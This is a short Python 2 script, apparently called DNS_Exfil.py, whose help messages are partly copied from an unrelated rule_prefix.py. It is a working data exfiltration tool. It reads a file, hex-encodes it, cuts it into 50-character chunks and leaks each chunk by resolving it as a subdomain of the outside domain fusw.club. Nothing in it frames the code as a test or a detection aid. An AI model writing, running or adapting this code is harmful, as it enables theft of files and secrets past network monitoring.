
import sys, getopt
import os, socket
# def main(argv):
#     return 0

def main(argv):
    inputfile = ''
    prefix = ''
    link = ''
    try:
        opts, args = getopt.getopt(argv,"hi:p:l:",["infile=","prefix=","link="])
    except getopt.GetoptError:
        print ('rule_prefix.py -i <input directory> -p <prefix> -l <slack link>')
        sys.exit(2)
    if(not opts):
        print ('Syntax: rule_prefix.py -i <input directory> -p <prefix> -l <slack link>')
        sys.exit()
    for opt, arg in opts:
        if opt == '-h':
            print ('DNS_Exfil.py -i <input file> ')
            sys.exit()
        elif opt in ("-i", "--infile"):
            inputfile = arg

    # print (inputfile)
    exfil(inputfile)


def exfil(file):
    tokens = hexify(file)
    for token in tokens:
        domain = token + '.fusw.club'
        socket.gethostbyname(domain)
        

def hexify(file):
    s = open(file,"rb").read()
    s = s.encode('hex')
    token = []
    while len(s) > 50:
        token.append(s[:50])
        s = s[50:]
    token.append(s)
    return token
if __name__ == "__main__":
       main(sys.argv[1:])